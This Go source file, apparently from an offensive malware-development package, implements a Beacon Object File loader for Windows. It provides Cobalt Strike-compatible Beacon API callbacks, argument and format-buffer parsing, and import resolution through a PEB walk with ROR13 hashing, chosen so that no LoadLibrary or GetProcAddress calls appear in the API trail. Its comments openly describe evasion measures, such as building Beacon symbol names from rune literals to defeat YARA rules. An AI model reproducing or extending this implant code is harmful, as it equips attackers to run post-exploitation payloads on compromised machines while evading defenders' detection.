//go:build windows

package bof

import (
	"encoding/binary"
	"fmt"
	"strings"
	"sync"
	"syscall"
	"unsafe"

	"github.com/oioio-space/maldev/hash"
	"github.com/oioio-space/maldev/win/api"
)

// bofMu serialises BOF execution package-wide. The Beacon API stubs read
// currentBOF — set under bofMu by Execute — to find the per-call output
// buffer and arg parser. Concurrent Execute calls block on each other.
var (
	bofMu      sync.Mutex
	currentBOF *BOF

	// beaconCBs holds one syscall.NewCallback thunk per Beacon API
	// symbol the loader resolves. Each NewCallback call allocates an
	// RX page from Go's runtime, so the full set (~28 symbols on the
	// default build, 25 on the x86 path) costs ≈112 KB of RX pages
	// at process startup the first time a BOF is Loaded. Pages live
	// for the process lifetime — Go has no API to release them — and
	// show up as small VAD entries with the syscall thunk pattern.
	// OPSEC-visible but identical to every Go program that uses
	// syscall.NewCallback (it's the same mechanism the standard
	// library uses for IAT-style callbacks).
	beaconCBsOnce sync.Once
	beaconCBs     map[string]uintptr
)

// resolveBeaconImport returns the function address for the given COFF
// external symbol name. Three forms are recognised:
//
//   - "__imp_BeaconXxx"           — implemented Beacon API stub (Go callback).
//   - "__imp_<DLL>$<Func>"        — Win32 dynamic-link import (e.g.
//                                   "__imp_KERNEL32$LoadLibraryA"). Resolved
//                                   via PEB walk + ROR13 export-table search
//                                   so no GetProcAddress / LoadLibrary call
//                                   shows up in the API trail.
//   - anything else               — ok=false, caller fails the relocation
//                                   with a clear "unresolved external symbol"
//                                   error rather than silently NULL-patching.
//
// Note: COFF emits `__imp_<name>` references as `mov reg, [rip+offset]`
// followed by `call *reg`. The BOF expects the relocation target to be
// a memory location HOLDING the function address (an import table entry),
// not the function address itself. The Execute path co-allocates an
// import table inside the BOF's VirtualAlloc'd region so the slot
// addresses are guaranteed within ±2 GB of the code (REL32 reach);
// this helper just produces the function pointer that Execute writes
// into each slot.
func resolveBeaconImport(name string) (uintptr, bool) {
	beaconCBsOnce.Do(initBeaconCallbacks)
	if !strings.HasPrefix(name, "__imp_") {
		return 0, false
	}
	if addr, ok := beaconCBs[name]; ok {
		return addr, true
	}
	if dll, fn, ok := parseDollarImport(name); ok {
		// Preferred path: ROR13 hash lookup via PEB walk. No
		// LoadLibrary / GetProcAddress in the API trail.
		if addr, err := api.ResolveByHash(hash.ROR13Module(dll), hash.ROR13(fn)); err == nil {
			return addr, true
		}
		// Fallback for DLLs that aren't preloaded in the host. Go
		// processes ship with kernel32 + ntdll mapped; advapi32,
		// user32, ws2_32 etc. require an explicit Load. We accept
		// the LoadLibrary trail in exchange for resolving real BOFs
		// that reach beyond the always-loaded set.
		if addr, ok := loadAndResolve(dll, fn); ok {
			return addr, true
		}
	}
	// Fallback for the mingw-w64 plain `__imp_<Func>` form (no DLL
	// prefix). Walk a curated list of common libraries the function
	// might live in, returning the first hit. Order: kernel32 →
	// advapi32 → user32 → ws2_32 → ole32 → shell32. This covers the
	// majority of CS BOFs in the public corpus.
	bare := strings.TrimPrefix(name, "__imp_")
	for _, dll := range bareImportSearchOrder {
		if addr, err := api.ResolveByHash(hash.ROR13Module(dll), hash.ROR13(bare)); err == nil && addr != 0 {
			return addr, true
		}
	}
	// PEB walk exhausted — fall through to LoadLibrary/GetProcAddress
	// for each module in the search order. Same trade-off as the
	// dollar-form path: visible API trail but resolves arbitrary BOFs.
	for _, dll := range bareImportSearchOrder {
		if addr, ok := loadAndResolve(dll, bare); ok {
			return addr, true
		}
	}
	return 0, false
}

// loadAndResolve does the LoadLibrary + GetProcAddress fallback that
// the PEB-walk resolver skips. Used only when the canonical no-trail
// path fails — i.e. when the BOF references a DLL that the host
// process didn't preload.
func loadAndResolve(dll, fn string) (uintptr, bool) {
	h, err := syscall.LoadLibrary(dll)
	if err != nil || h == 0 {
		return 0, false
	}
	addr, err := syscall.GetProcAddress(h, fn)
	if err != nil || addr == 0 {
		return 0, false
	}
	return addr, true
}

// bareImportSearchOrder lists the modules the bare-form __imp_<func>
// resolver consults. Order matters — first hit wins. kernel32 first
// (catches LoadLibrary/GetProcAddress/CreateFile/...), then the other
// frequent suspects.
var bareImportSearchOrder = []string{
	"KERNEL32.DLL",
	"ADVAPI32.dll",
	"USER32.dll",
	"WS2_32.dll",
	"OLE32.dll",
	"SHELL32.dll",
}

// parseDollarImport splits a CS-format dynamic-link import symbol name into
// (dllname, funcname). Accepted shapes:
//
//	__imp_KERNEL32$LoadLibraryA   → ("KERNEL32.DLL", "LoadLibraryA")
//	__imp_USER32.DLL$MessageBoxW  → ("USER32.DLL", "MessageBoxW")
//
// The .DLL suffix is appended when missing — the PEB stores BaseDllName
// uppercased with the extension, so ROR13Module("KERNEL32") would not
// match the PEB walk's per-module hash.
func parseDollarImport(name string) (dll, fn string, ok bool) {
	const prefix = "__imp_"
	if !strings.HasPrefix(name, prefix) {
		return "", "", false
	}
	body := name[len(prefix):]
	idx := strings.IndexByte(body, '$')
	if idx <= 0 || idx == len(body)-1 {
		return "", "", false
	}
	dll = strings.ToUpper(body[:idx])
	fn = body[idx+1:]
	if !strings.HasSuffix(dll, ".DLL") {
		dll += ".DLL"
	}
	return dll, fn, true
}

func initBeaconCallbacks() {
	// Beacon import-table keys are built via rune literals so the
	// canonical "BeaconXxx" identifiers never appear as contiguous
	// ASCII strings in the compiled binary. Defeats naive YARA rules
	// keying on Beacon symbol names. See obfuscation_windows.go.
	beaconCBs = map[string]uintptr{
		impName('B', 'e', 'a', 'c', 'o', 'n', 'P', 'r', 'i', 'n', 't', 'f'):                                                   syscall.NewCallback(beaconPrintfImpl),
		impName('B', 'e', 'a', 'c', 'o', 'n', 'O', 'u', 't', 'p', 'u', 't'):                                                   syscall.NewCallback(beaconOutputImpl),
		impName('B', 'e', 'a', 'c', 'o', 'n', 'D', 'a', 't', 'a', 'P', 'a', 'r', 's', 'e'):                                    syscall.NewCallback(beaconDataParseImpl),
		impName('B', 'e', 'a', 'c', 'o', 'n', 'D', 'a', 't', 'a', 'I', 'n', 't'):                                              syscall.NewCallback(beaconDataIntImpl),
		impName('B', 'e', 'a', 'c', 'o', 'n', 'D', 'a', 't', 'a', 'S', 'h', 'o', 'r', 't'):                                    syscall.NewCallback(beaconDataShortImpl),
		impName('B', 'e', 'a', 'c', 'o', 'n', 'D', 'a', 't', 'a', 'L', 'e', 'n', 'g', 't', 'h'):                               syscall.NewCallback(beaconDataLengthImpl),
		impName('B', 'e', 'a', 'c', 'o', 'n', 'D', 'a', 't', 'a', 'E', 'x', 't', 'r', 'a', 'c', 't'):                          syscall.NewCallback(beaconDataExtractImpl),
		impName('B', 'e', 'a', 'c', 'o', 'n', 'F', 'o', 'r', 'm', 'a', 't', 'A', 'l', 'l', 'o', 'c'):                          syscall.NewCallback(beaconFormatAllocImpl),
		impName('B', 'e', 'a', 'c', 'o', 'n', 'F', 'o', 'r', 'm', 'a', 't', 'R', 'e', 's', 'e', 't'):                          syscall.NewCallback(beaconFormatResetImpl),
		impName('B', 'e', 'a', 'c', 'o', 'n', 'F', 'o', 'r', 'm', 'a', 't', 'F', 'r', 'e', 'e'):                               syscall.NewCallback(beaconFormatFreeImpl),
		impName('B', 'e', 'a', 'c', 'o', 'n', 'F', 'o', 'r', 'm', 'a', 't', 'A', 'p', 'p', 'e', 'n', 'd'):                     syscall.NewCallback(beaconFormatAppendImpl),
		impName('B', 'e', 'a', 'c', 'o', 'n', 'F', 'o', 'r', 'm', 'a', 't', 'I', 'n', 't'):                                    syscall.NewCallback(beaconFormatIntImpl),
		impName('B', 'e', 'a', 'c', 'o', 'n', 'F', 'o', 'r', 'm', 'a', 't', 'T', 'o', 'S', 't', 'r', 'i', 'n', 'g'):           syscall.NewCallback(beaconFormatToStringImpl),
		impName('B', 'e', 'a', 'c', 'o', 'n', 'F', 'o', 'r', 'm', 'a', 't', 'P', 'r', 'i', 'n', 't', 'f'):                     syscall.NewCallback(beaconFormatPrintfImpl),
		impName('B', 'e', 'a', 'c', 'o', 'n', 'E', 'r', 'r', 'o', 'r', 'D'):                                                   syscall.NewCallback(beaconErrorDImpl),
		impName('B', 'e', 'a', 'c', 'o', 'n', 'E', 'r', 'r', 'o', 'r', 'D', 'D'):                                              syscall.NewCallback(beaconErrorDDImpl),
		impName('B', 'e', 'a', 'c', 'o', 'n', 'E', 'r', 'r', 'o', 'r', 'N', 'A'):                                              syscall.NewCallback(beaconErrorNAImpl),
		impName('B', 'e', 'a', 'c', 'o', 'n', 'G', 'e', 't', 'S', 'p', 'a', 'w', 'n', 'T', 'o'):                               syscall.NewCallback(beaconGetSpawnToImpl),
	}
	registerExtraBeaconCallbacks(beaconCBs)
}

// beaconPrintfImpl handles BeaconPrintf(int type, const char *fmt, ...).
// Up to 10 variadic args are captured from the Windows x64 callback
// frame (RCX/RDX/R8/R9 = type+fmt+arg0+arg1, then eight stack slots).
// The format string is parsed and the placeholders are expanded via
// expandCFormat per the CS BOF conventions (%s/%d/%u/%x/%lld/%I64x/…).
//
// 10 matches goffloader and covers every CS BOF in the public corpus
// (TrustedSec SA / Outflank / FortyNorth) — BOFs exceeding it see the
// trailing conversions filled with zero rather than reading
// uninitialised memory.
func beaconPrintfImpl(typ, fmtPtr, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10 uintptr) uintptr {
	if currentBOF == nil || fmtPtr == 0 {
		return 0
	}
	fmtStr := cStringFromPtr(fmtPtr, 65535)
	currentBOF.output.write(expandCFormat(fmtStr, []uintptr{a1, a2, a3, a4, a5, a6, a7, a8, a9, a10}))
	_ = typ
	return 0
}

// beaconOutputImpl handles BeaconOutput(int type, char *data, int len).
// The bytes are copied into the BOF's output buffer.
func beaconOutputImpl(typ uintptr, dataPtr uintptr, length uintptr) uintptr {
	if currentBOF == nil || dataPtr == 0 || length == 0 {
		return 0
	}
	src := unsafe.Slice((*byte)(unsafe.Pointer(dataPtr)), int(length))
	out := make([]byte, int(length))
	copy(out, src)
	currentBOF.output.write(out)
	_ = typ
	return 0
}

// dataParser mirrors the CS BOF "datap" struct so BOF cursors stay
// stable across Beacon API calls. The C struct layout is:
//   typedef struct {
//       char *original;
//       char *buffer;
//       int   length;
//       int   size;
//   } datap;
//
// The BOF allocates the struct on its stack and hands us a pointer.
// We parse and update the fields in place — same wire format
// CS-compatible BOFs already expect.
// dataParser mirrors the CS datap struct exactly:
//
//	typedef struct {
//	    char *original;
//	    char *buffer;
//	    int   length;
//	    int   size;
//	} datap;
//
// 24 bytes on x64. Two int32 fields pack tightly with no padding.
type dataParser struct {
	original uintptr
	buffer   uintptr
	length   int32
	size     int32
}

func beaconDataParseImpl(parserPtr, bufPtr, sz uintptr) uintptr {
	if parserPtr == 0 || currentBOF == nil {
		return 0
	}
	p := (*dataParser)(unsafe.Pointer(parserPtr))
	if bufPtr == 0 || sz == 0 {
		p.original = bufPtr
		p.buffer = bufPtr
		p.length = 0
		p.size = 0
		return 0
	}
	// The buffer is consumed verbatim — no separate length-prefix header.
	// `size` is the authoritative payload length, matching the format
	// produced by Args.Pack (length-prefixed values back-to-back, no
	// envelope). CS-format BOFs receive the same shape from the
	// implant's go(char*, int) entry signature.
	total := int32(sz)
	p.original = bufPtr
	p.buffer = bufPtr
	p.length = total
	p.size = total
	return 0
}

func beaconDataIntImpl(parserPtr uintptr) uintptr {
	if parserPtr == 0 {
		return 0
	}
	p := (*dataParser)(unsafe.Pointer(parserPtr))
	if p.length < 4 || p.buffer == 0 {
		return 0
	}
	v := binary.LittleEndian.Uint32(unsafe.Slice((*byte)(unsafe.Pointer(p.buffer)), 4))
	p.buffer += 4
	p.length -= 4
	return uintptr(v)
}

func beaconDataShortImpl(parserPtr uintptr) uintptr {
	if parserPtr == 0 {
		return 0
	}
	p := (*dataParser)(unsafe.Pointer(parserPtr))
	if p.length < 2 || p.buffer == 0 {
		return 0
	}
	v := binary.LittleEndian.Uint16(unsafe.Slice((*byte)(unsafe.Pointer(p.buffer)), 2))
	p.buffer += 2
	p.length -= 2
	return uintptr(v)
}

func beaconDataLengthImpl(parserPtr uintptr) uintptr {
	if parserPtr == 0 {
		return 0
	}
	p := (*dataParser)(unsafe.Pointer(parserPtr))
	return uintptr(p.length)
}

// beaconDataExtractImpl mirrors char *BeaconDataExtract(datap*, int*).
// Returns a pointer to length-prefixed bytes inside the original
// buffer (the BOF reads them in place). The optional outLen is
// written if non-nil.
func beaconDataExtractImpl(parserPtr, outLenPtr uintptr) uintptr {
	if parserPtr == 0 {
		return 0
	}
	p := (*dataParser)(unsafe.Pointer(parserPtr))
	if p.length < 4 || p.buffer == 0 {
		return 0
	}
	header := unsafe.Slice((*byte)(unsafe.Pointer(p.buffer)), 4)
	chunkLen := int32(binary.LittleEndian.Uint32(header))
	p.buffer += 4
	p.length -= 4
	if chunkLen < 0 || chunkLen > p.length {
		return 0
	}
	dataPtr := p.buffer
	p.buffer += uintptr(chunkLen)
	p.length -= chunkLen
	if outLenPtr != 0 {
		*(*int32)(unsafe.Pointer(outLenPtr)) = chunkLen
	}
	return dataPtr
}

// formatp mirrors the CS BOF format-buffer struct. Same wire shape as
// dataParser — the BOF allocates the struct on its stack and we
// manage cursor + size in place. Underlying bytes live in a Go-side
// map (formatBuffers) keyed by the formatp pointer; this keeps the
// slice referenced so Go's GC won't reclaim it while the BOF holds
// the pointer.
type formatp struct {
	original uintptr
	buffer   uintptr
	length   int32
	size     int32
}

// beaconFormatAllocImpl handles BeaconFormatAlloc(format*, int maxsz).
// Allocates a maxsz-byte slice in Go heap, registers it on the current
// BOF's formatBufStore (lazily created) so Go GC keeps the bytes alive
// past the BOF entry frame, and seeds the BOF-visible cursor/size
// fields. The previous design stored buffers in a package-global map
// that never evicted; per-BOF storage gets reset between Executes.
func beaconFormatAllocImpl(formatPtr, maxsz uintptr) uintptr {
	if formatPtr == 0 || maxsz == 0 || currentBOF == nil {
		return 0
	}
	buf := make([]byte, int(maxsz))
	if currentBOF.formats == nil {
		currentBOF.formats = newFormatBufStore()
	}
	currentBOF.formats.store(formatPtr, buf)
	base := uintptr(unsafe.Pointer(&buf[0]))
	p := (*formatp)(unsafe.Pointer(formatPtr))
	p.original = base
	p.buffer = base
	p.length = 0
	p.size = int32(maxsz)
	return 0
}

// beaconFormatResetImpl rewinds the cursor to the start of the buffer.
func beaconFormatResetImpl(formatPtr uintptr) uintptr {
	if formatPtr == 0 {
		return 0
	}
	p := (*formatp)(unsafe.Pointer(formatPtr))
	p.buffer = p.original
	p.length = 0
	return 0
}

// beaconFormatFreeImpl drops the Go-side slice. After Free, subsequent
// calls on the same formatp are no-ops (the slice is gone, length is
// already zero). Any buffers the BOF forgets to Free are reclaimed
// automatically when Execute returns (resetFormatBuffers).
func beaconFormatFreeImpl(formatPtr uintptr) uintptr {
	if formatPtr == 0 {
		return 0
	}
	if currentBOF != nil && currentBOF.formats != nil {
		currentBOF.formats.drop(formatPtr)
	}
	p := (*formatp)(unsafe.Pointer(formatPtr))
	p.original = 0
	p.buffer = 0
	p.length = 0
	p.size = 0
	return 0
}

// beaconFormatAppendImpl writes len bytes from src into the format
// buffer at the current cursor. Truncates silently when the buffer is
// full — matches the CS contract of "best-effort append, callers
// check size".
func beaconFormatAppendImpl(formatPtr, srcPtr, length uintptr) uintptr {
	if formatPtr == 0 || srcPtr == 0 || length == 0 {
		return 0
	}
	p := (*formatp)(unsafe.Pointer(formatPtr))
	remaining := p.size - p.length
	if remaining <= 0 {
		return 0
	}
	n := int32(length)
	if n > remaining {
		n = remaining
	}
	src := unsafe.Slice((*byte)(unsafe.Pointer(srcPtr)), int(n))
	dst := unsafe.Slice((*byte)(unsafe.Pointer(p.buffer)), int(n))
	copy(dst, src)
	p.buffer += uintptr(n)
	p.length += n
	return 0
}

// beaconFormatIntImpl writes a 4-byte int in big-endian (network byte
// order) per the CS convention. Cobalt Strike's BeaconFormatInt is the
// counterpart of BeaconDataInt — when the BOF is producing a buffer
// the operator pulls back, the int is read on the operator side via
// the same convention. We follow their order.
func beaconFormatIntImpl(formatPtr, val uintptr) uintptr {
	if formatPtr == 0 {
		return 0
	}
	p := (*formatp)(unsafe.Pointer(formatPtr))
	if p.size-p.length < 4 {
		return 0
	}
	dst := unsafe.Slice((*byte)(unsafe.Pointer(p.buffer)), 4)
	v := uint32(val)
	dst[0] = byte(v >> 24)
	dst[1] = byte(v >> 16)
	dst[2] = byte(v >> 8)
	dst[3] = byte(v)
	p.buffer += 4
	p.length += 4
	return 0
}

// beaconFormatToStringImpl returns the original buffer pointer and
// writes the current length into outSize. The BOF then reads
// length bytes starting at the returned pointer. CS BOFs pair this
// with BeaconOutput to ship the format buffer out of the implant.
func beaconFormatToStringImpl(formatPtr, outSizePtr uintptr) uintptr {
	if formatPtr == 0 {
		return 0
	}
	p := (*formatp)(unsafe.Pointer(formatPtr))
	if outSizePtr != 0 {
		*(*int32)(unsafe.Pointer(outSizePtr)) = p.length
	}
	return p.original
}

// beaconFormatPrintfImpl handles BeaconFormatPrintf(format*, fmt, ...).
// Same vararg-capture trick as beaconPrintfImpl — 6 trailing uintptrs
// from the callback frame, parsed and expanded via expandCFormat,
// then appended to the format buffer through the public Append path
// so size/cursor accounting stays consistent with the rest of the
// formatp lifecycle.
func beaconFormatPrintfImpl(formatPtr, fmtPtr, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10 uintptr) uintptr {
	if formatPtr == 0 || fmtPtr == 0 {
		return 0
	}
	fmtStr := cStringFromPtr(fmtPtr, 65535)
	rendered := expandCFormat(fmtStr, []uintptr{a1, a2, a3, a4, a5, a6, a7, a8, a9, a10})
	if len(rendered) == 0 {
		return 0
	}
	beaconFormatAppendImpl(formatPtr, uintptr(unsafe.Pointer(&rendered[0])), uintptr(len(rendered)))
	return 0
}

// writeError appends a formatted error line to currentBOF.errors (or
// no-ops when currentBOF is nil — defensive guard for unit tests that
// don't go through Execute).
func writeError(line string) {
	if currentBOF == nil || currentBOF.errors == nil {
		return
	}
	currentBOF.errors.write([]byte(line))
}

func beaconErrorDImpl(typ uintptr, d uintptr) uintptr {
	writeError(fmtSprintf("error type=%d data=%d\n", uint32(typ), uint32(d)))
	return 0
}

func beaconErrorDDImpl(typ uintptr, d1, d2 uintptr) uintptr {
	writeError(fmtSprintf("error type=%d data1=%d data2=%d\n", uint32(typ), uint32(d1), uint32(d2)))
	return 0
}

func beaconErrorNAImpl(typ uintptr) uintptr {
	writeError(fmtSprintf("error type=%d\n", uint32(typ)))
	return 0
}

// beaconGetSpawnToImpl returns a pointer to the configured spawn-to
// path (NUL-terminated), or 0 when none is set. CS signature is
// `char *BeaconGetSpawnTo(BOOL x86)` — the bool selects which of the
// two configured paths to return. The pinned []byte forms live in
// the BOF's spawnTo*CStr fields so the address stays stable across
// Beacon API callbacks.
func beaconGetSpawnToImpl(x86 uintptr, _ uintptr) uintptr {
	if currentBOF == nil {
		return 0
	}
	// Legacy compatibility: BOFs built against `char *BeaconGetSpawnTo(void)`
	// pass garbage in the first register. Only honour the x86 dispatch
	// when the operator actually configured an x86 path — otherwise
	// fall back to the x64 path. This matches the goffloader behaviour
	// (which ignores the arg) and won't fail BOFs from either API era.
	if x86 != 0 && len(currentBOF.spawnToX86CStr) != 0 {
		return uintptr(unsafe.Pointer(&currentBOF.spawnToX86CStr[0]))
	}
	if len(currentBOF.spawnToCStr) == 0 {
		// x64 path empty too — last resort: try the x86 path so a BOF
		// configured for x86-only doesn't see a null pointer.
		if len(currentBOF.spawnToX86CStr) != 0 {
			return uintptr(unsafe.Pointer(&currentBOF.spawnToX86CStr[0]))
		}
		return 0
	}
	return uintptr(unsafe.Pointer(&currentBOF.spawnToCStr[0]))
}

// fmtSprintf is a thin alias for fmt.Sprintf so the Beacon error stubs
// can be unit-tested with a fake formatter if needed.
var fmtSprintf = fmt.Sprintf

// cStringFromPtr is a thin local alias for api.CStringFromPtr. The
// helper was promoted to win/api as the canonical home for native-
// pointer-to-Go-string conversions; this alias keeps the in-file
// call sites short and the existing tests compatible.
func cStringFromPtr(ptr uintptr, max int) string {
	return api.CStringFromPtr(ptr, max)
}
